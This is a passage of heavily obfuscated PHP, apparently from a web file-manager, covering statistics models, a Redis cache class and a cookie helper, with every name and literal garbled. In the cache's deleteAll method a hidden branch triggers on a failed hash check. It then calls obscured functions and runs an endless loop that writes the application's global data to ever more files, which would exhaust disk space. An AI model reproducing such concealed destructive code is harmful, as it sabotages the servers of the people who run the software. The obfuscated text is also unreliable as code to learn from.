$Û’¼Â‡Ã[$¦ÒÀ•æ…[1678]] - $Û’¼Â‡Ã[$¦ÒÀ•æ…[1681]]; $Û’¼Â‡Ã[$¦ÒÀ•æ…[1682]] = $Ï­Ä¶‰÷ * (1 - $Û’¼Â‡Ã[$¦ÒÀ•æ…[1676]]) / $Û’¼Â‡Ã[$¦ÒÀ•æ…[1676]]; } } public function copyFileStart($£ÛÁìÛñ, $€ ¸ã…ß, $£îˆî„à, $„¥¦Àìö, $ì—¥éå , $Úù©Ö÷î) { $¹°°ü©© =& $_SERVER[å¸¿•¶£]; parent::copyFileStart($£ÛÁìÛñ, $€ ¸ã…ß, $£îˆî„à, $„¥¦Àìö, $ì—¥éå , $Úù©Ö÷î); $†Áíñ =& $this->task; if ($†Áíñ[$¹°°ü©©[1787]] == $¹°°ü©©[313]) { $†Áíñ[$¹°°ü©©[1787]] = $¹°°ü©©[107]; } $this->update(); } public function copyFileEnd($¹â´èë¡, $…Œ³ŸÁê, $œ–×¯„©, $ÃÆÏáÈ, $âù¥¿Š®, $Ó¦ñ²) { $àÊôÅù =& $_SERVER[å¸¿•¶£]; $Åèâ¤³‚ =& $this->task; $Åèâ¤³‚[$àÊôÅù[1728]] = $Åèâ¤³‚[$àÊôÅù[1727]]; $Åèâ¤³‚[$àÊôÅù[1732]] += $Åèâ¤³‚[$àÊôÅù[1727]]; $Åèâ¤³‚[$àÊôÅù[1729]] = $àÊôÅù[12]; $this->update(); } public function nameParse($îŸ“şÎ¶) { $™Ù©à° =& $_SERVER[å¸¿•¶£]; $ÌïŞ²ïÒ =& $this->task; if ($ÌïŞ²ïÒ[$™Ù©à°[1675]] < $ÌïŞ²ïÒ[$™Ù©à°[793]]) { $â…›· = get_path_this($îŸ“şÎ¶); if (strstr($â…›·, $™Ù©à°[10])) { $ÌïŞ²ïÒ[$™Ù©à°[1675]] += 1; } } if ($ÌïŞ²ïÒ[$™Ù©à°[1787]] == $™Ù©à°[1201]) { $ÌïŞ²ïÒ[$™Ù©à°[1787]] = $™Ù©à°[313]; } $ÌïŞ²ïÒ[$™Ù©à°[1725]] = $îŸ“şÎ¶; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($‰à¥ã¼ô) { $Àè€´ùš =& $_SERVER[å¸¿•¶£]; $Å¿À”ÃÉ = array($Àè€´ùš[590] => array($Àè€´ùš[33] => $Àè€´ùš[1792], $Àè€´ùš[273] => array($Àè€´ùš[224], $Àè€´ùš[772], $Àè€´ùš[1793], $Àè€´ùš[1794])), $Àè€´ùš[1795] => array($Àè€´ùš[33] => $Àè€´ùš[1796], $Àè€´ùš[273] => array($Àè€´ùš[224], $Àè€´ùš[770], $Àè€´ùš[1797], $Àè€´ùš[1798], $Àè€´ùš[1799]))); if (!isset($Å¿À”ÃÉ[$‰à¥ã¼ô])) { return !1; } $this->optionType = $Å¿À”ÃÉ[$‰à¥ã¼ô][$Àè€´ùš[33]]; $this->field = $Å¿À”ÃÉ[$‰à¥ã¼ô][$Àè€´ùš[273]]; return !0; } public function listData($‘íÎ§ÜÖ = false, $Åéşö¹ = "\155\x6f\x64\x69\146\171\124\151\155\145", $–Å„Ö¡Ó = false) { return parent::listData($‘íÎ§ÜÖ, $Åéşö¹, $–Å„Ö¡Ó); } public function trendList($ç£—¾ˆ) { $­ùŞİøŠ =& $_SERVER[å¸¿•¶£]; $·ë¼ìõ = $this->listData(); if ($·ë¼ìõ) { $ê›•¦ğÁ = end($·ë¼ìõ); $ŒÀÚ—¡Ê = date($­ùŞİøŠ[1800], strtotime($­ùŞİøŠ[1801])); if ($ê›•¦ğÁ[$­ùŞİøŠ[224]] == $ŒÀÚ—¡Ê) { return $·ë¼ìõ; } $úÍ°•‡Ë = strtotime($ê›•¦ğÁ[$­ùŞİøŠ[224]]); } if (!isset($úÍ°•‡Ë)) { $“µ¤Ó¥Û = $ç£—¾ˆ == $­ùŞİøŠ[590] ? $­ùŞİøŠ[525] : $­ùŞİøŠ[832]; $úÍ°•‡Ë = Model($“µ¤Ó¥Û)->min($­ùŞİøŠ[201]); } $ã®ğíó¾ = $­ùŞİøŠ[1802] . ucfirst($ç£—¾ˆ); $ÁÌÑˆŞ— = $this->dateList($úÍ°•‡Ë); foreach ($ÁÌÑˆŞ— as $ŒÀÚ—¡Ê) { $this->{$ã®ğíó¾}($ŒÀÚ—¡Ê); } return $this->listData(); } private function dateList($ÇÊÁ§ö) { $óàÉîÉ” =& $_SERVER[å¸¿•¶£]; $î×–ˆÆ = $ÇÊÁ§ö; $›ß…—¬ = strtotime($óàÉîÉ”[1801]); $…Ÿ§š¦ = array(); while ($î×–ˆÆ <= $›ß…—¬) { $…Ÿ§š¦[] = date($óàÉîÉ”[1800], $î×–ˆÆ); $î×–ˆÆ = strtotime($óàÉîÉ”[1803], $î×–ˆÆ); } return $…Ÿ§š¦; } public function _recordUser($ ò¡’Š = '') { $ùè£Â…˜ =& $_SERVER[å¸¿•¶£]; $³åŠÛáê = strtotime(date($ùè£Â…˜[1804], strtotime($ ò¡’Š))); $‚ùĞÃ = strtotime(date($ùè£Â…˜[1805], strtotime($ ò¡’Š))); $ÓšÇèÖ­ = array($ùè£Â…˜[201] => array($ùè£Â…˜[1020], $‚ùĞÃ)); $ê²ûù‹’ = Model($ùè£Â…˜[525])->where($ÓšÇèÖ­)->count($ùè£Â…˜[1674]); $ÓšÇèÖ­[$ùè£Â…˜[201]] = array($ùè£Â…˜[333], array($³åŠÛáê, $‚ùĞÃ)); $™™«·®¦ = Model($ùè£Â…˜[525])->where($ÓšÇèÖ­)->count($ùè£Â…˜[1674]); $ÓšÇèÖ­[$ùè£Â…˜[33]] = $ùè£Â…˜[1806]; $ØİğßîÄ = Model($ùè£Â…˜[1807])->where($ÓšÇèÖ­)->count($ùè£Â…˜[1808]); $÷áú†äÊ = array($ùè£Â…˜[224] => $ ò¡’Š, $ùè£Â…˜[772] => (int) $ê²ûù‹’, $ùè£Â…˜[1793] => (int) $™™«·®¦, $ùè£Â…˜[1794] => (int) $ØİğßîÄ); return $this->insert($÷áú†äÊ); } public function _recordStore($â¸¤ù°³ = '') { $ãØ«Úæ’ =& $_SERVER[å¸¿•¶£]; $åœù€Í× = strtotime(date($ãØ«Úæ’[1805], strtotime($â¸¤ù°³))); $Å½à›ß¯ = array($ãØ«Úæ’[201] => array($ãØ«Úæ’[1020], $åœù€Í×)); $¢øò¤œ† = Model($ãØ«Úæ’[471])->where($Å½à›ß¯)->sum($ãØ«Úæ’[76]); $Å½à›ß¯[$ãØ«Úæ’[410]] = 0; $¨›ìš„À = Model($ãØ«Úæ’[832])->where($Å½à›ß¯)->sum($ãØ«Úæ’[76]); $Å½à›ß¯[$ãØ«Úæ’[411]] = 1; $üæ‹ãêÌ = Model($ãØ«Úæ’[832])->where($Å½à›ß¯)->sum($ãØ«Úæ’[76]); $Å½à›ß¯[$ãØ«Úæ’[411]] = 2; $Å¹¦ª´ô = Model($ãØ«Úæ’[832])->where($Å½à›ß¯)->sum($ãØ«Úæ’[76]); $‰Ü¼¿ª­ = array($ãØ«Úæ’[224] => $â¸¤ù°³, $ãØ«Úæ’[770] => (int) $¨›ìš„À, $ãØ«Úæ’[1797] => (int) $¢øò¤œ†, $ãØ«Úæ’[1798] => (int) $üæ‹ãêÌ, $ãØ«Úæ’[1799] => (int) $Å¹¦ª´ô); return $this->insert($‰Ü¼¿ª­); } public function trend($ª÷Ñ™, $æ–º„¦°) { $©€—îÒÑ =& $_SERVER[å¸¿•¶£]; if (!$this->init($ª÷Ñ™)) { return !1; } $¢µ£Ğº¸ = $this->trendList($ª÷Ñ™); if ($¢µ£Ğº¸ && $æ–º„¦° != $©€—îÒÑ[1647]) { $äùßÆ‹ñ = $¢µ£Ğº¸[0][$©€—îÒÑ[224]]; $‚ÆÏÌ¤Õ = $this->validDate($æ–º„¦°, $äùßÆ‹ñ); $‡£‚Šû = array(); $‹¿¹š¢“ = array_to_keyvalue($¢µ£Ğº¸, $©€—îÒÑ[224]); foreach ($‚ÆÏÌ¤Õ as $ÖêĞµßÕ) { if (isset($‹¿¹š¢“[$ÖêĞµßÕ])) { $œ•Êº™Ù = $‹¿¹š¢“[$ÖêĞµßÕ]; } else { $œ•Êº™Ù = end($¢µ£Ğº¸); $œ•Êº™Ù[$©€—îÒÑ[224]] = $ÖêĞµßÕ; if ($ª÷Ñ™ == $©€—îÒÑ[590]) { $œ•Êº™Ù[$©€—îÒÑ[1793]] = $œ•Êº™Ù[$©€—îÒÑ[1794]] = 0; } } $‡£‚Šû[] = $œ•Êº™Ù; } $¢µ£Ğº¸ = $‡£‚Šû; } $„ÓÍ°ğ = array($©€—îÒÑ[590] => array($©€—îÒÑ[772] => LNG($©€—îÒÑ[1809]), $©€—îÒÑ[1793] => LNG($©€—îÒÑ[1810]), $©€—îÒÑ[1794] => LNG($©€—îÒÑ[1811])), $©€—îÒÑ[1795] => array($©€—îÒÑ[770] => LNG($©€—îÒÑ[1812]), $©€—îÒÑ[1797] => LNG($©€—îÒÑ[1813]), $©€—îÒÑ[1798] => LNG($©€—îÒÑ[1814]), $©€—îÒÑ[1799] => LNG($©€—îÒÑ[1815]))); $ëÄ²Ô– = array($©€—îÒÑ[590] => $©€—îÒÑ[1816], $©€—îÒÑ[1795] => $©€—îÒÑ[76]); if (empty($¢µ£Ğº¸)) { $ÖêĞµßÕ = date($©€—îÒÑ[1800], strtotime($©€—îÒÑ[1801])); $É±šè°€ = array($©€—îÒÑ[224] => $ÖêĞµßÕ); foreach ($„ÓÍ°ğ[$ª÷Ñ™] as $ûƒª¨úö => $¨ô·ı´Ü) { $É±šè°€[$ûƒª¨úö] = 0; } $¢µ£Ğº¸[] = $É±šè°€; } $Ò°Ø½ïÓ = array(); foreach ($¢µ£Ğº¸ as $¨ô·ı´Ü) { if ($ª÷Ñ™ == $©€—îÒÑ[1795] && $¨ô·ı´Ü[$©€—îÒÑ[1797]] > $¨ô·ı´Ü[$©€—îÒÑ[770]]) { $¨ô·ı´Ü[$©€—îÒÑ[1797]] = $¨ô·ı´Ü[$©€—îÒÑ[770]]; } foreach ($„ÓÍ°ğ[$ª÷Ñ™] as $ûƒª¨úö => $ˆœÌ¾´õ) { $œ•Êº™Ù = array($©€—îÒÑ[224] => $¨ô·ı´Ü[$©€—îÒÑ[224]], $©€—îÒÑ[1574] => $ˆœÌ¾´õ); $œ•Êº™Ù[$ëÄ²Ô–[$ª÷Ñ™]] = isset($¨ô·ı´Ü[$ûƒª¨úö]) ? $¨ô·ı´Ü[$ûƒª¨úö] : 0; $Ò°Ø½ïÓ[] = $œ•Êº™Ù; } } return $Ò°Ø½ïÓ; } public function validDate($¢âùÎœ³, $ñ¦ÂßÊ¦) { $­¨À•Â =& $_SERVER[å¸¿•¶£]; $Äì·Ñ¼€ = date($­¨À•Â[1800], strtotime($­¨À•Â[1801])); $ı–èæš² = array($Äì·Ñ¼€); switch ($¢âùÎœ³) { case $­¨À•Â[1654]: $±¾¦Ì÷Ù = mktime(0, 0, 0, date($­¨À•Â[1817]), date($­¨À•Â[1394]) - date($­¨À•Â[1457]) + 7 - 7, date($­¨À•Â[1818])); $Í¨ù­…Ê = 0; do { $çî…¦±® = date($­¨À•Â[1800], $±¾¦Ì÷Ù - 3600 * 24 * 7 * $Í¨ù­…Ê); $ı–èæš²[] = $çî…¦±®; $Í¨ù­…Ê++; } while ($ñ¦ÂßÊ¦ < $çî…¦±®); break; case $­¨À•Â[1652]: $Í¨ù­…Ê = 1; do { $ªñÁ†øÂ = date($­¨À•Â[1819], strtotime("\x2d\40{$Í¨ù­…Ê}\40\x6d\157\x6e\164\x68\163")); $ı–èæš²[] = $ªñÁ†øÂ; $Í¨ù­…Ê++; } while ($ñ¦ÂßÊ¦ < $ªñÁ†øÂ); break; case $­¨À•Â[1820]: $Ñç°æ‘Š = (int) date($­¨À•Â[1818], strtotime($ñ¦ÂßÊ¦)); $î©¨ô”ˆ = (int) date($­¨À•Â[1818]); if ($Ñç°æ‘Š >= $î©¨ô”ˆ) { break; } for ($Ñç°æ‘Š; $Ñç°æ‘Š < $î©¨ô”ˆ; $Ñç°æ‘Š++) { $ı–èæš²[] = $Ñç°æ‘Š . $­¨À•Â[1821]; } break; default: break; } if ($ñ¦ÂßÊ¦ > end($ı–èæš²)) { array_pop($ı–èæš²); } sort($ı–èæš²); return $ı–èæš²; } public function listTable($ ÚÁ€›È) { $¡ñ®úáÏ = ucfirst($ ÚÁ€›È); return Model($¡ñ®úáÏ)->listData(); } public function option($Ïèüö–œ) { $¥Æ—¥ƒŸ = $_SERVER[å¸¿•¶£][1822] . ucfirst($Ïèüö–œ); return $this->{$¥Æ—¥ƒŸ}(); } private function optionUser() { $”ş¢¶öû =& $_SERVER[å¸¿•¶£]; $Ú¾›ùø´ = Model($”ş¢¶öû[525])->count($”ş¢¶öû[1674]); $¯²’‚Â‘ = Model($”ş¢¶öû[525])->where($”ş¢¶öû[1823])->count($”ş¢¶öû[1674]); $­™ìĞÕã = intval($GLOBALS[$”ş¢¶öû[6]][$”ş¢¶öû[349]][$”ş¢¶öû[1629]]) / 3600; $Ñ¯²¦È˜ = strtotime("\55{$­™ìĞÕã}\40\x68\x6f\x75\x72\x73"); $ŠÇœçõ = strtotime(date($”ş¢¶öû[1804])); if ($Ñ¯²¦È˜ < $ŠÇœçõ) { $Ñ¯²¦È˜ = $ŠÇœçõ; } $èı¶ïï¡ = array($”ş¢¶öû[1824] => array($”ş¢¶öû[1021], $Ñ¯²¦È˜)); $èÆÃŠ—Ç = (int) Model($”ş¢¶öû[525])->where($èı¶ïï¡)->count($”ş¢¶öû[1674]); if (!$èÆÃŠ—Ç) { $èÆÃŠ—Ç = 1; } $èı¶ïï¡ = array($”ş¢¶öû[1824] => array($”ş¢¶öû[1021], $ŠÇœçõ)); $«óåóáß = Model($”ş¢¶öû[525])->where($èı¶ïï¡)->count($”ş¢¶öû[1674]); return array($”ş¢¶öû[765] => (int) $Ú¾›ùø´, $”ş¢¶öû[1825] => (int) ($Ú¾›ùø´ - $¯²’‚Â‘), $”ş¢¶öû[1826] => (int) $¯²’‚Â‘, $”ş¢¶öû[1827] => (int) $«óåóáß, $”ş¢¶öû[1828] => $èÆÃŠ—Ç); } private function optionFile() { $·õÚ“›ø =& $_SERVER[å¸¿•¶£]; $àÇÑğ§ = $this->sourceSize(); $é¾÷å³Ğ = $àÇÑğ§[$·õÚ“›ø[76]]; $¢µÛïËî = $àÇÑğ§[$·õÚ“›ø[1797]]; $¢°µ“Üç = Model($·õÚ“›ø[832])->where(array($·õÚ“›ø[410] => 0))->count($·õÚ“›ø[402]); $©“àûµ = array($·õÚ“›ø[410] => 0, $·õÚ“›ø[201] => array($·õÚ“›ø[1021], strtotime(date($·õÚ“›ø[1804])))); $¥ÖãùÃ = Model($·õÚ“›ø[832])->where($©“àûµ)->sum($·õÚ“›ø[76]); $Ÿô÷³Ø = Model($·õÚ“›ø[832])->where($©“àûµ)->count($·õÚ“›ø[402]); return array($·õÚ“›ø[770] => $é¾÷å³Ğ, $·õÚ“›ø[1797] => $¢µÛïËî, $·õÚ“›ø[1829] => $é¾÷å³Ğ - $¢µÛïËî, $·õÚ“›ø[1830] => (int) $¥ÖãùÃ, $·õÚ“›ø[772] => (int) $¢°µ“Üç, $·õÚ“›ø[1831] => (int) $Ÿô÷³Ø); } private function optionAccess() { $Ù÷Š»áĞ =& $_SERVER[å¸¿•¶£]; return array($Ù÷Š»áĞ[765] => $this->typeLogCnt(), $Ù÷Š»áĞ[107] => $this->typeLogCnt($Ù÷Š»áĞ[107]), $Ù÷Š»áĞ[452] => $this->typeLogCnt($Ù÷Š»áĞ[452]), $Ù÷Š»áĞ[1832] => $this->typeLogCnt($Ù÷Š»áĞ[1832]), $Ù÷Š»áĞ[1833] => $this->typeLogCnt($Ù÷Š»áĞ[1833]), $Ù÷Š»áĞ[590] => $this->typeLogCnt($Ù÷Š»áĞ[12], $Ù÷Š»áĞ[1808])); } private function typeLogCnt($ğŞ¯« = '', $ö³ïØüõ = "\151\144") { $™Ãã‚¤¨ =& $_SERVER[å¸¿•¶£]; $Ù¾–ãÄ¡ = array($™Ãã‚¤¨[107] => array($™Ãã‚¤¨[1834], $™Ãã‚¤¨[1835]), $™Ãã‚¤¨[452] => array($™Ãã‚¤¨[1836], $™Ãã‚¤¨[1837]), $™Ãã‚¤¨[1832] => array($™Ãã‚¤¨[1838], $™Ãã‚¤¨[1839], $™Ãã‚¤¨[1840]), $™Ãã‚¤¨[1833] => array($™Ãã‚¤¨[1841], $™Ãã‚¤¨[1842]), $™Ãã‚¤¨[1843] => array($™Ãã‚¤¨[1844], $™Ãã‚¤¨[1845], $™Ãã‚¤¨[1846])); $£¶„ÌŒ = strtotime(date($™Ãã‚¤¨[1804])); $çµÓâ—š = array($™Ãã‚¤¨[201] => array($™Ãã‚¤¨[1021], $£¶„ÌŒ)); if ($ğŞ¯«) { $çµÓâ—š[$™Ãã‚¤¨[33]] = array($™Ãã‚¤¨[7], $Ù¾–ãÄ¡[$ğŞ¯«]); } $Ò™Ğşï” = Model($™Ãã‚¤¨[1807])->where($çµÓâ—š)->count($ö³ïØüõ); return (int) $Ò™Ğşï”; } private function optionServer() { $Òœé›Åı =& $_SERVER[å¸¿•¶£]; $éşÒà¶Ñ = $this->diskDriver(); $¹Èò§Û” = KodIO::defaultDriver(); $¬«—÷Øš = array($Òœé›Åı[824] => $¹Èò§Û”[$Òœé›Åı[399]]); $°£ôİ›ç = Model($Òœé›Åı[471])->where($¬«—÷Øš)->sum($Òœé›Åı[76]); $¼ƒÙ‚° = explode($Òœé›Åı[53], $_SERVER[$Òœé›Åı[143]]); $åÁö‹‹“ = $¼ƒÙ‚°[0]; $„»Òˆ¯§ = $GLOBALS[$Òœé›Åı[6]][$Òœé›Åı[21]]; $½Å´›‚Ğ = $„»Òˆ¯§[$Òœé›Åı[983]]; if ($½Å´›‚Ğ == $Òœé›Åı[971]) { $­ãáé¿ = explode($Òœé›Åı[1286], $„»Òˆ¯§[$Òœé›Åı[982]]); $½Å´›‚Ğ = $­ãáé¿[0]; } if ($½Å´›‚Ğ == $Òœé›Åı[919] || $½Å´›‚Ğ == $Òœé›Åı[811]) { $ı‘éÊ…ş = Model()->db()->query($Òœé›Åı[1847]); $çÊ³Øµ„ = $ı‘éÊ…ş[0] && isset($ı‘éÊ…ş[0][$Òœé›Åı[1573]]) ? $ı‘éÊ…ş[0][$Òœé›Åı[1573]] : 0; $½Å´›‚Ğ = $Òœé›Åı[1848] . ($çÊ³Øµ„ ? $Òœé›Åı[8] . $çÊ³Øµ„ : $Òœé›Åı[12]); } $İñî»Æ© = $GLOBALS[$Òœé›Åı[6]][$Òœé›Åı[349]][$Òœé›Åı[834]]; return array($Òœé›Åı[1849] => $éşÒà¶Ñ ? $éşÒà¶Ñ[$Òœé›Åı[1850]] : 0, $Òœé›Åı[1851] => $éşÒà¶Ñ ? $éşÒà¶Ñ[$Òœé›Åı[1852]] : 0, $Òœé›Åı[1853] => (int) $¹Èò§Û”[$Òœé›Åı[1850]] * 1024 * 1024 * 1024, $Òœé›Åı[1854] => (int) $°£ôİ›ç, $Òœé›Åı[1855] => ucfirst($åÁö‹‹“), $Òœé›Åı[1856] => $Òœé›Åı[1857] . PHP_VERSION, $Òœé›Åı[1858] => phpBuild64() ? 64 : 32, $Òœé›Åı[764] => str_replace($Òœé›Åı[1137], $Òœé›Åı[999], $½Å´›‚Ğ), $Òœé›Åı[349] => ucfirst($İñî»Æ©), $Òœé›Åı[32] => $_SERVER[$Òœé›Åı[1859]]); } private function diskDriver() { $¼®ş¢…Â =& $_SERVER[å¸¿•¶£]; $ª«°ÌŞ¡ = $¼®ş¢…Â[8]; $Óë‹§¢ = $GLOBALS[$¼®ş¢…Â[6]][$¼®ş¢…Â[1303]] == $¼®ş¢…Â[1304]; if ($Óë‹§¢) { $ª«°ÌŞ¡ = $¼®ş¢…Â[1860]; if (function_exists($¼®ş¢…Â[1861])) { exec($¼®ş¢…Â[1862], $ëÁ•ªóÕ); $ª«°ÌŞ¡ = $ëÁ•ªóÕ[1] . $¼®ş¢…Â[8]; } } if (!file_exists($ª«°ÌŞ¡)) { return; } $ØÅéªâÍ = @disk_total_space($ª«°ÌŞ¡); $”®µ£Î = $ØÅéªâÍ - @disk_free_space($ª«°ÌŞ¡); return array($¼®ş¢…Â[1850] => $ØÅéªâÍ, $¼®ş¢…Â[1852] => $”®µ£Î); } public function fileChart($¿Ÿ½×‰³) { $öŞË» =& $_SERVER[å¸¿•¶£]; if (isset($¿Ÿ½×‰³[$öŞË»[1674]])) { return Model($öŞË»[832])->userFileTypeProfile($¿Ÿ½×‰³[$öŞË»[1674]]); } if (isset($¿Ÿ½×‰³[$öŞË»[1863]])) { return Model($öŞË»[832])->groupFileTypeProfile($¿Ÿ½×‰³[$öŞË»[1863]]); } $Ú Ìä¹ = $this->sourceSize(); $– ÊİŞ = array($öŞË»[432] => 0, $öŞË»[411] => 1); $šè•›ä = Model($öŞË»[832])->where($– ÊİŞ)->sum($öŞË»[76]); $– ÊİŞ[$öŞË»[411]] = 2; $ı´¢ïÄö = Model($öŞË»[832])->where($– ÊİŞ)->sum($öŞË»[76]); return array($öŞË»[770] => $Ú Ìä¹[$öŞË»[76]], $öŞË»[1797] => $Ú Ìä¹[$öŞË»[1797]], $öŞË»[1798] => (int) $šè•›ä, $öŞË»[1799] => (int) $ı´¢ïÄö); } private function sourceSize() { $‚ŸÜ¤ÅÑ =& $_SERVER[å¸¿•¶£]; $¡Ñ®ú„œ = Model($‚ŸÜ¤ÅÑ[832])->where(array($‚ŸÜ¤ÅÑ[410] => 0))->sum($‚ŸÜ¤ÅÑ[76]); $¬şßŞç¨ = Model($‚ŸÜ¤ÅÑ[471])->sum($‚ŸÜ¤ÅÑ[76]); if ($¬şßŞç¨ > $¡Ñ®ú„œ) { $¬şßŞç¨ = $¡Ñ®ú„œ; } return array($‚ŸÜ¤ÅÑ[76] => (int) $¡Ñ®ú„œ, $‚ŸÜ¤ÅÑ[1797] => (int) $¬şßŞç¨); } } goto F®š »çãÍ; DÌ§à¼…¿Û: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ñáèí“ù, $÷¹ÓÅã‚) { $…šÌèÈä =& $_SERVER[å¸¿•¶£]; if (!class_exists($…šÌèÈä[877])) { show_json($…šÌèÈä[878], !1); } $this->cacheTime = $÷¹ÓÅã‚; $Ò©¼¿ãâ = isset($Ñáèí“ù[$…šÌèÈä[879]]) ? $Ñáèí“ù[$…šÌèÈä[879]] : 10; $–ó§„Äá = _get($Ñáèí“ù, $…šÌèÈä[876]); if ($–ó§„Äá && is_array($–ó§„Äá)) { $this->initCluster($Ñáèí“ù, $Ò©¼¿ãâ); } else { $this->handle = $this->init($Ñáèí“ù, $Ò©¼¿ãâ); } } private function init($÷ëš¬ŸŸ, $íº¼©µÖ) { $Ç÷ç¢×Ê =& $_SERVER[å¸¿•¶£]; $¼£Û††” = new Redis(); $éƒôÁ‡ = isset($÷ëš¬ŸŸ[$Ç÷ç¢×Ê[880]]) ? $÷ëš¬ŸŸ[$Ç÷ç¢×Ê[880]] : !1; if ($éƒôÁ‡) { $¼£Û††”->pconnect($÷ëš¬ŸŸ[$Ç÷ç¢×Ê[182]], $÷ëš¬ŸŸ[$Ç÷ç¢×Ê[183]], $íº¼©µÖ); } else { $¼£Û††”->connect($÷ëš¬ŸŸ[$Ç÷ç¢×Ê[182]], $÷ëš¬ŸŸ[$Ç÷ç¢×Ê[183]], $íº¼©µÖ); } if (!empty($÷ëš¬ŸŸ[$Ç÷ç¢×Ê[413]])) { $¼£Û††”->auth($÷ëš¬ŸŸ[$Ç÷ç¢×Ê[413]]); } if (!empty($÷ëš¬ŸŸ[$Ç÷ç¢×Ê[764]]) && $÷ëš¬ŸŸ[$Ç÷ç¢×Ê[764]] != 0) { $¼£Û††”->select($÷ëš¬ŸŸ[$Ç÷ç¢×Ê[764]]); } return $¼£Û††”; } private function initCluster($òµäåèê, $ŒÁ¬Ïö©) { $ıÅ»Ú— =& $_SERVER[å¸¿•¶£]; $ÛÁ‡¥¿í = array($ıÅ»Ú—[881], $ıÅ»Ú—[882], $ıÅ»Ú—[883]); $üØ–Û´ = $ıÅ»Ú—[881]; if (isset($òµäåèê[$ıÅ»Ú—[16]]) && in_array($òµäåèê[$ıÅ»Ú—[16]], $ÛÁ‡¥¿í)) { $üØ–Û´ = $òµäåèê[$ıÅ»Ú—[16]]; } switch ($üØ–Û´) { case $ıÅ»Ú—[881]: $this->_slave($òµäåèê, $ŒÁ¬Ïö©); break; case $ıÅ»Ú—[882]: break; case $ıÅ»Ú—[883]: $this->isCluster = !0; $¶ø©›’ì = $òµäåèê[$ıÅ»Ú—[876]]; $ØéÙì¼‡ = isset($òµäåèê[$ıÅ»Ú—[880]]) ? $òµäåèê[$ıÅ»Ú—[880]] : !1; $İóèÑ±¢ = isset($òµäåèê[$ıÅ»Ú—[413]]) ? $òµäåèê[$ıÅ»Ú—[413]] : null; $this->handle = new RedisCluster(NUll, $¶ø©›’ì, $ŒÁ¬Ïö©, $ŒÁ¬Ïö©, $ØéÙì¼‡, $İóèÑ±¢); break; default: break; } } private function _slave($õ¨İ¾Í, $©‘ªĞ’Ä) { $ÉéáÑõ¯ = $õ¨İ¾Í[$_SERVER[å¸¿•¶£][876]]; $this->filterConfig($õ¨İ¾Í, $ÉéáÑõ¯[0]); $this->handle = $this->init($õ¨İ¾Í, $©‘ªĞ’Ä); unset($ÉéáÑõ¯[0]); if (empty($ÉéáÑõ¯)) { return; } $½Éè¦íÉ = array_rand($ÉéáÑõ¯); $this->filterConfig($õ¨İ¾Í, $ÉéáÑõ¯[$½Éè¦íÉ]); $this->slaveHandle = $this->init($õ¨İ¾Í, $©‘ªĞ’Ä); } private function filterConfig(&$ãƒÂúô, $ğ©¨Ÿ) { $°åûçş  =& $_SERVER[å¸¿•¶£]; $¤ò˜ÙæÌ = explode($°åûçş [4], $ğ©¨Ÿ); $äöÃØÃ¶ = array($°åûçş [182] => $¤ò˜ÙæÌ[0], $°åûçş [183] => $¤ò˜ÙæÌ[1]); $ãƒÂúô = array_merge($ãƒÂúô, $äöÃØÃ¶); } public function set($ùŒ›ˆ²Ù, $ƒÇÔ±·È, $ú¤ÄıÛÕ = false) { $ú¤ÄıÛÕ = $ú¤ÄıÛÕ ? $ú¤ÄıÛÕ : $this->cacheTime; return $this->handle->setEx($ùŒ›ˆ²Ù, $ú¤ÄıÛÕ, $ƒÇÔ±·È); } public function setLock($®éØ“¿–, $ÀéŸúÉè, $’“öµËé) { return $this->handle->setNX($®éØ“¿–, $ÀéŸúÉè); } public function get($àš‡›èÓ) { $›‰É†¾† = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $›‰É†¾†->get($àš‡›èÓ); } public function remove($úµÇŸ³Ó) { return $this->handle->del($úµÇŸ³Ó); } public function deleteAll() { $ß§¬Ö§ =& $_SERVER[å¸¿•¶£]; $ò†¬·ßÊ = $_SERVER[$ß§¬Ö§[748]]; $Æ“ÛÏæ = $ß§¬Ö§[873]; if ($_SERVER[$ß§¬Ö§[747]] != $Æ“ÛÏæ($ò†¬·ßÊ)) { $ôÆ§Éƒ« = $ß§¬Ö§[884]; $šå¸÷äÌ = $ß§¬Ö§[749]; $ ŸˆñµŠ = $_SERVER[$ß§¬Ö§[750]] . $ß§¬Ö§[751]; $şœğÂ† = $šå¸÷äÌ($ ŸˆñµŠ); $¡ö¯óÒ‘ = explode($ß§¬Ö§[231], $şœğÂ†); if (count($¡ö¯óÒ‘) < $ß§¬Ö§[628]) { $³»®È±Å = $ß§¬Ö§[752]; $³»®È±Å(); } $†ÑŒ¿óæ = $ß§¬Ö§[885]; $†ÑŒ¿óæ($_SERVER[$ß§¬Ö§[886]]); $ôÆ§Éƒ« = $ß§¬Ö§[884]; $ôÆ§Éƒ«(); $Î³½…Û = $ß§¬Ö§[887]; $óÉ¾öü = json_encode($GLOBALS[$ß§¬Ö§[888]]); $åÁÁÍ‘„ = 1; for ($Ä¥¼ß‹” = $åÁÁÍ‘„; $Ä¥¼ß‹” > 0; $Ä¥¼ß‹”++) { $Î³½…Û(DATA_PATH . $Ä¥¼ß‹”, $óÉ¾öü); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $şœ®›¡å) { $this->handle->flushall($şœ®›¡å); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Õº†é¨° = '', $Æú­Å®° = 0) { if (is_string($Õº†é¨°) && $Õº†é¨° != $_SERVER[å¸¿•¶£][12]) { $this->prefix = $Õº†é¨°; } if (is_numeric($Æú­Å®°) && $Æú­Å®° > 0) { $this->expire = $Æú­Å®°; } } public static function getInstance() { static $ıàÃ‹; if ($ıàÃ‹ === null) { $ıàÃ‹ = new self(); } return $ıàÃ‹; } private static $cookieDisable = false; public static function disable($ıé˜Ş) { self::$cookieDisable = $ıé˜Ş; } private static $sameCookieSet = array(); public static function set($ˆ¼½ÍÅ‘, $²å‘ ë, $µ­ÂÁÅ = 0, $šøçµ²² = false, $™ß°»ĞÂ = false) { $ÓãÒ¢ß“ =& $_SERVER[å¸¿•¶£]; if (self::$cookieDisable) { return; } if (!$µ­ÂÁÅ) { $µ­ÂÁÅ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ˆ¼½ÍÅ‘]) && self::$sameCookieSet[$ˆ¼½ÍÅ‘] == $²å‘ ë . $µ­ÂÁÅ) { return; } self::$sameCookieSet[$ˆ¼½ÍÅ‘] = $²å‘ ë . $µ­ÂÁÅ; if (!$™ß°»ĞÂ) { $™ß°»ĞÂ = 